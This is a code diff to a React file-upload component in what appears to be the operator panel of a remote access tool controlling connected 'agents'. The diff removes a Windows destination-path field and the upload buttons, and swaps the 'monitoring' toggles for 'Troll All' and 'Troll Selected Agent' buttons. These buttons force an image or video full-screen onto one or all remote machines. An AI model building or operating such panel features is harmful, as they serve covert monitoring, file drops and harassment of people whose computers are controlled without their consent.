@@ -1,5 +1,5 @@
 import React, { useEffect, useRef, useState } from 'react';
-import { AlertCircle, File as FileIcon, Folder, Image, Trash2, Upload, Video } from 'lucide-react';
+import { AlertCircle, File as FileIcon, Image, Trash2, Upload, Video } from 'lucide-react';
 import { useSocket } from './SocketProvider';
 import { Alert, AlertDescription } from './ui/alert';
 import { Button } from './ui/button';
@@ -60,9 +60,8 @@ function getFileIcon(type: string) {
 }
 
 export function BulkUploadManager() {
-  const { socket, connected, selectedAgent, setSelectedAgent, agents, uploadFile } = useSocket() as any;
+  const { socket, connected, selectedAgent, setSelectedAgent, agents, uploadFile, trollShowImage, trollShowVideo } = useSocket() as any;
   const [files, setFiles] = useState<PendingFile[]>([]);
-  const [folderPath, setFolderPath] = useState('');
   const [isDragging, setIsDragging] = useState(false);
   const [error, setError] = useState('');
   const [success, setSuccess] = useState('');
@@ -70,6 +69,13 @@ export function BulkUploadManager() {
   const [uploadingById, setUploadingById] = useState<Record<string, boolean>>({});
   const [progressById, setProgressById] = useState<Record<string, number>>({});
   const fileInputRef = useRef<HTMLInputElement>(null);
+
+  const requestDurationMs = (defaultMs: number) => {
+    const s = window.prompt('Enter duration in seconds', String(Math.round(defaultMs / 1000)));
+    const v = s ? Number(s) : NaN;
+    const sec = Number.isFinite(v) && v > 0 ? v : Math.round(defaultMs / 1000);
+    return Math.max(1000, Math.min(600000, sec * 1000));
+  };
 
   const formatError = (err: unknown) => {
     if (err instanceof Error) return err.message;
@@ -146,8 +152,6 @@ export function BulkUploadManager() {
         if (!data) return;
         if (data.agent_id !== selectedAgent) return;
         if (data.filename !== pending.file.name) return;
-        const destination = data.destination_path || data.destination;
-        if (destination !== expectedDestinationPath) return;
         if (typeof data.progress === 'number' && data.progress >= 0) {
           setProgressById((prev) => ({ ...prev, [pending.id]: data.progress }));
         }
@@ -158,8 +162,6 @@ export function BulkUploadManager() {
         if (!data) return;
         if (data.agent_id !== selectedAgent) return;
         if (data.filename !== pending.file.name) return;
-        const destination = data.destination_path || data.destination;
-        if (destination !== expectedDestinationPath) return;
         cleanup();
         setProgressById((prev) => ({ ...prev, [pending.id]: 100 }));
         resolve();
@@ -176,7 +178,7 @@ export function BulkUploadManager() {
     setSuccess('');
     setIsUploading(true);
     try {
-      await uploadAndWait(pending, folderPath);
+      await uploadAndWait(pending, "");
       setFiles((prev) => prev.filter((f) => f.id !== pending.id));
       setSuccess(`File ${pending.file.name} uploaded successfully`);
     } catch (err) {
@@ -206,7 +208,7 @@ export function BulkUploadManager() {
 
     for (const pending of [...files]) {
       try {
-        await uploadAndWait(pending, folderPath);
+        await uploadAndWait(pending, "");
         setFiles((prev) => prev.filter((f) => f.id !== pending.id));
         successCount++;
       } catch (err) {
@@ -224,6 +226,38 @@ export function BulkUploadManager() {
   const removeFile = (fileId: string) => {
     setFiles((prev) => prev.filter((f) => f.id !== fileId));
   };
+
+  // Global progress listeners as fallback to ensure UI updates
+  useEffect(() => {
+    const onGlobalProgress = (event: any) => {
+      const data = event?.detail;
+      if (!data) return;
+      const fname = String(data.filename || '');
+      const idx = files.findIndex((f) => f.file.name === fname);
+      if (idx >= 0 && typeof data.progress === 'number') {
+        const id = files[idx].id;
+        setUploadingById((prev) => ({ ...prev, [id]: true }));
+        setProgressById((prev) => ({ ...prev, [id]: Math.max(0, Math.min(100, data.progress)) }));
+      }
+    };
+    const onGlobalComplete = (event: any) => {
+      const data = event?.detail;
+      if (!data) return;
+      const fname = String(data.filename || '');
+      const idx = files.findIndex((f) => f.file.name === fname);
+      if (idx >= 0) {
+        const id = files[idx].id;
+        setProgressById((prev) => ({ ...prev, [id]: 100 }));
+        setUploadingById((prev) => ({ ...prev, [id]: false }));
+      }
+    };
+    window.addEventListener('file_upload_progress', onGlobalProgress);
+    window.addEventListener('file_upload_complete', onGlobalComplete);
+    return () => {
+      window.removeEventListener('file_upload_progress', onGlobalProgress);
+      window.removeEventListener('file_upload_complete', onGlobalComplete);
+    };
+  }, [files]);
 
   return (
     <div className="space-y-4 w-full max-w-5xl mx-auto">
@@ -260,18 +294,42 @@ export function BulkUploadManager() {
               </Select>
               <Button
                 variant="outline"
-                onClick={() => {
-                  if (!socket || !connected) return;
-                  socket.emit('operator_toggle_feature', { feature: 'monitoring', enabled: true });
+                onClick={async () => {
+                  if (!connected) return;
+                  if (files.length === 0) {
+                    setError('No file selected to troll');
+                    return;
+                  }
+                  const f = files[0].file;
+                  if (String(f.type || '').toLowerCase().startsWith('video/')) {
+                    await trollShowVideo(null, f, { duration_ms: 8000 });
+                    setSuccess(`Trolled all agents with video ${f.name}`);
+                  } else {
+                    const dur = requestDurationMs(5000);
+                    await trollShowImage(null, f, { duration_ms: dur, mode: 'cover' });
+                    setSuccess(`Trolled all agents with ${f.name}`);
+                  }
                 }}
               >
                 Troll All
               </Button>
               <Button
                 disabled={!selectedAgent}
-                onClick={() => {
-                  if (!socket || !connected || !selectedAgent) return;
-                  socket.emit('operator_toggle_feature', { feature: 'monitoring', enabled: true, agent_id: selectedAgent });
+                onClick={async () => {
+                  if (!connected || !selectedAgent) return;
+                  if (files.length === 0) {
+                    setError('No file selected to troll');
+                    return;
+                  }
+                  const f = files[0].file;
+                  if (String(f.type || '').toLowerCase().startsWith('video/')) {
+                    await trollShowVideo(selectedAgent, f, { duration_ms: 8000 });
+                    setSuccess(`Trolled ${selectedAgent} with video ${f.name}`);
+                  } else {
+                    const dur = requestDurationMs(5000);
+                    await trollShowImage(selectedAgent, f, { duration_ms: dur, mode: 'cover' });
+                    setSuccess(`Trolled ${selectedAgent} with ${f.name}`);
+                  }
                 }}
               >
                 Troll Selected Agent
@@ -291,21 +349,7 @@ export function BulkUploadManager() {
             </Alert>
           )}
 
-          <div className="space-y-2">
-            <Label htmlFor="folder-path">Target Folder or Full Path</Label>
-            <div className="flex flex-col sm:flex-row gap-2">
-              <Input
-                id="folder-path"
-                placeholder="C:\\Users\\Username\\Downloads"
-                value={folderPath}
-                onChange={(e) => setFolderPath(e.target.value)}
-                className="font-mono flex-1 min-w-0"
-              />
-              <Button variant="outline" size="icon" className="shrink-0" onClick={() => setFolderPath('C:\\Users\\')}>
-                <Folder className="h-4 w-4" />
-              </Button>
-            </div>
-          </div>
+          {/* destination path UI removed */}
 
           <div
             className={`border-2 border-dashed rounded-lg p-6 sm:p-8 text-center cursor-pointer transition-colors select-none ${
@@ -344,10 +388,6 @@ export function BulkUploadManager() {
             <div className="space-y-2">
               <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-2">
                 <h4 className="font-medium">Selected Files ({files.length})</h4>
-                <Button onClick={uploadAllFiles} disabled={isUploading || !selectedAgent} size="sm" className="sm:self-auto self-start">
-                  <Upload className="h-4 w-4 mr-2" />
-                  Upload All
-                </Button>
               </div>
 
               <div className="space-y-1 max-h-[40vh] sm:max-h-64 overflow-y-auto">
@@ -372,15 +412,6 @@ export function BulkUploadManager() {
                       )}
                     </div>
                     <div className="flex gap-1 justify-end sm:justify-start">
-                      <Button
-                        onClick={() => void uploadSingle(pending)}
-                        disabled={isUploading || uploadingById[pending.id] || !selectedAgent}
-                        size="icon"
-                        variant="outline"
-                        title="Upload file"
-                      >
-                        <Upload className="h-3 w-3" />
-                      </Button>
                       <Button
                         onClick={() => removeFile(pending.id)}
                         disabled={uploadingById[pending.id]}
